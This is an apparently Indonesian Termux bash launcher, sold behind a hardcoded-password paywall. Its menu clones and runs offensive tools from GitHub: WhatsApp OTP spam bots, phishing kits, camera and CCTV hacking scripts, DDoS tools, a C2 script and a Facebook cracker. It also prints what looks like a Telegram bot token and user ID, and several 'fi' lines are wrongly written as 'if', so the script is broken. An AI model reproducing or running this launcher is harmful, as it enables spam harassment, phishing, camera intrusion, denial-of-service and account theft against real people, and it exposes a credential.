clear
xdg-open ="https://wa.me/+628999859595?text=.Bang-beli-sc-excutor-bang-hozoo-harga-berapa"
sleep 0.4
echo "SEDANG ON TERMUX FILE"
termux-setup-storage
sleep 0.4
## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
} 
sleep 0.4
printf '{5951232585}'
echo " id user "
sleep 0.4
printf "{7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo}"
echo -e "YOUTUBE: SPOKYHOZOO"
echo -e "TIKTOK :SPOKYHOZOO02"
echo -e "TEAM: SYSTEM UMBRELLA DRAK999"
verify_credentials() {
local expected_username="G404"
local expected_password="KALI"
while true; do
read -p "Username: " username
read -s -p "Password: " password
echo
if [ "$username" == "$expected_username" ] && [ "$password" == "$expected_password" ]; then
echo "Login berhasil!"
break
else
echo "ANDA BELUM LANGGANAN HOZOO SILAKAN BELI DULU TOOLS NYA "
fi
done
}
verify_credentials
sleep 2
clear
 xdg-open "https://chat.whatsapp.com/LAUoVvlbiTZ52NQtk5N1IR"
sleep 1
echo -e    "$blue┌─────────────────────────────────────────────────────────────────────────────────┐"
echo -e  "$purple|            ||| EXUCUTOR SYSTEM UMBRELLA DRAK999||||                             |"   
echo -e "$purpl|         ||||||  SELAMAT DATANG DI TOOLS HOZOO |||||||                           |"
echo -e  "$purple└─────────────────────────────────────────────────────────────────────────────────┘"
echo -e "$purple└─────────────────────────────────────────────────────────────────────────────┘"
echo -e "$red\e[31m┌──────────────────────────────────────────────────────────────────────────────┐"
echo -e "$purple|$purple\e[31m|[1].SPAM OTP WA 01              $red|[11].CAMDUMPER                              |"
echo -e "$purple|$purple\e[31m|[2].KANDURA OTP 02              $red[12].HACK CAMERA                             |"
echo -e "$purple|$purple\e[31m|[3].SPAM OTP   03               $red[13].CCTV WEB                                |"
echo -e "$purple|$purple\e[31m|[4].SPAM OTP 04                 $red|[14].DDOS BY HOZOO                          |"
echo -e "$purple|$purple\e[31m|[5].TERMUX BANNER               $red|[15].KANDURA-VIIP BY HOZOO                  |"
echo -e "$purple|$purple\e[31m|[6].TERMUX BANNER JARVIS        $red|[16].PANDORA BY MRSANZZ                     |"
echo -e "$purple|$purple\e[31m|[7].XPIZHER                     $red|[17].DDOS BY MRSANZZ                        |"
echo -e "$purple|$purple\e[31m|[8].SEKEER                      $red|[18].TOOLSV5 BY GALIRUS                     |"
echo -e "$purple|$purple\e[31m|[9].SQL                         $red|[19].OSINT IP                               |"
echo -e "$purple|$purple\e[31m|[10].OSINT INSTRAGRAM           $red|[20].CRACK FB                               |"
echo -e "$purple└─$purple─────────────────────────────────────────────────────────────────────────────┘"
echo -e "$red\e[31m┌──────────────────────────────────────────────────────────────────────────────┐"
echo -e "$purple|$purple\e[31m[UPDATE].   | [GC]|SYSTEM UMBRELLA DRAK999| [SALURAN] SYSTEM UMBRELLA DRAK99.    |"
echo -e "$purple|$purple\e[31m[YOUTUBE].  |SPOKYHOZOO.                  | [TIKTOK]. SPOKYHOZOO02.              |"   
echo -e "$purple└─────────────────────────────────────────────────────────────────────────────┘"

echo
read -p "└────────────>:" p
if [ $p == 1 ]
then
clear
git clone https://github.com/rickyfazaa/MySPAMBot-OTP
cd MySPAMBot-OTP
python main.py
fi
if [ $p == 2 ]
then
clear
termux-setup-storage
pkg install git
pkg install python
pkg install python2
pkg install python3
git clone https://github.com/Hozo999/KANDURA-WARNING
cd KANDURA-WARNING
chmod 777 kandura-warning.py
python kandura-warning.py
fi
if [ $p == 3 ]
then
clear
termux-setup-storage
pkg install git
pkg install python
pkg install python2
pkg install python3
git clone https://github.com/Hozo999/KANDURA-WARNING
cd KANDURA-WARNING
chmod 777 kandura-warning.py
python kandura-warning.py
fi
if [ $p == 4 ]
then
clear
termux-setup-storage
pkg install git
pkg install python
pkg install python2
pkg install python3
git clone https://github.com/Hozo999/KANDURA-WARNING
cd KANDURA-WARNING
chmod 777 kandura-warning.py
python kandura-warning.py
fi
if [ $p == 5 ]
then
clear
pkg install git
 apt update
apt upgrade
apt install git
git clone https://gitlab.com/0xsolo/t-mux-banner.git $ cd T-mux-Banner
bash install
 bash TXB.sh
fi
if [ $p == 6 ]
then
clear
pkg update && pkg upgrade
pkg install git bash python sox -y
cd $HOME
git clone --depth 1 https://github.com/Galirus404/JARVIS
cd JARVIS
python jarvis.py
fi
if [ $p == 7 ]
then
clear
apt-get update -y
apt-get install php -y
apt-get install openssh -y 
apt-get install wget -y
apt-get install git -y
git clone https://github.com/Black-Hell-Team/LordPhish.git
cd LordPhish
bash setup.sh 
bash lord.sh
fi
if [ $p == 8 ]
then
clear
git clone https://github.com/thewhiteh4t/seeker.git
cd seeker/
chmod +x install.sh
./install.sh
fi
if [ $p == 9 ]
then
clear
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python sqlmap.py -h
fi
if [ $p == 10 ]
then
clear
 pkg update && pkg upgrade
 pkg install python3
 pkg install git
 git clone https://github.com/Mr-Pstar7/osint-ig
 cd osint-ig
 bash setup.sh
 python main.py
fi
if [ $p == 11 ]
then
clear
apt-get install python3
apt-get install git
git clone https://github.com/erfannoori/Cam-Dumper.git
pip/pip3 install -r requirements.txt
pip install colorama
python3 Cam Dumper.py
fi
if [ $p == 12 ]
then
clear
termux-setup-storage
apt update && apt upgrade -y
apt install git -y
apt install php
apt install curl -y
apt install wget -y
git clone https://github.com/XPH4N70M/HACK-CAMERA.git
cd HACK-CAMERA
chmod +x hack_camera.sh
bash setup
bash hack_camera.sh
fi

if [ $p == 13 ]
then
clear
       apt-get install python3
       apt-get install git
       git clone https://github.com/akashblackhat/cctv-Hack.py.git
       cd cctv-Hack.py
       pip install -r requirements.txt
       ls
       python3 cctv-Hack.py
fi

if [ $p == 14 ]
then
clear
git clone https://github.com/SPOKYHOZOOO/ddos
cd ddos
chmod 777 kondom-bocor.py
python3 kondom-bocor.py
fi
if [ $p == 15 ]
then
clear
git clone https://github.com/Hozo999/kandura-viip
cd kandura-viip
chmod +x  KANDURA-VIIP.sh
./KANDURA-VIIP.sh
fi
if [ $p == 16 ]
then
clear
apt update && apt upgrade && pkg update && pkg upgrade
     pkg install curl
    pkg install wget
    pkg install python3
     pkg install git
     pkg install figlet
    git clone https://github.com/MrSanZz/pandora
    cd pandora
     pip3 install -r requirements.txt
    python3 pandora.py
fi
if [ $p == 17 ]
then
clear
pkg update && pkg upgrade
 pkg install curl
pkg install python3
pkg install git
 git clone https://github.com/MrSanZz/C2
 cd C2
 pip3 install -r requirements.txt
 python3 c2.py
fi
if [ $p == 18 ]
then
clear
pkg update && pkg upgrade
pkg install bash git -y
git clone --depth 1 https://github.com/Galirus404/TOOLSV5
cd TOOLSV5
bash install.sh
fi
if [ $p == 19 ]
then
clear
git clone https://github.com/U7P4L-IN/OSINT
cd OSINT 
chmod +x *
bash setup.sh
fi
if [ $p == 20 ]
then
clear
git clone https://github.com/MrzShell/HackFB
cd HackFB
chmod +x hack_new.pyc
python2 hack_new.pyc
fi
if [ $p == UPDATE ]
then
clear
git clone https://github.com/SPOKYHOZOOO/excutor-hozoo
cd excutor-hozoo
chmod +x EXCUTOR-HOZOO.sh
./EXCUTOR-HOZOO.sh
if

if [ $p == GC ]
then
clear
xdg-open "https://chat.whatsapp.com/LAUoVvlbiTZ52NQtk5N1IR"
if
if [ $p == SALURAN]
then
clear
xdg-open "https://whatsapp.com/channel/0029VaaZHPAEFeXdrMJa3B3g"
if

if [ $p == YOUTUBE ]
then
clear
xdg-open "https://youtube.com/@hozooprojek?si=w01R7lI6iskmP-_z"
if

if [ $p == TIKTOK ]
then
clear
xdg-open "https://www.tiktok.com/@spokyhozoo02?_t=8meA7S31McS&_r=1"
if




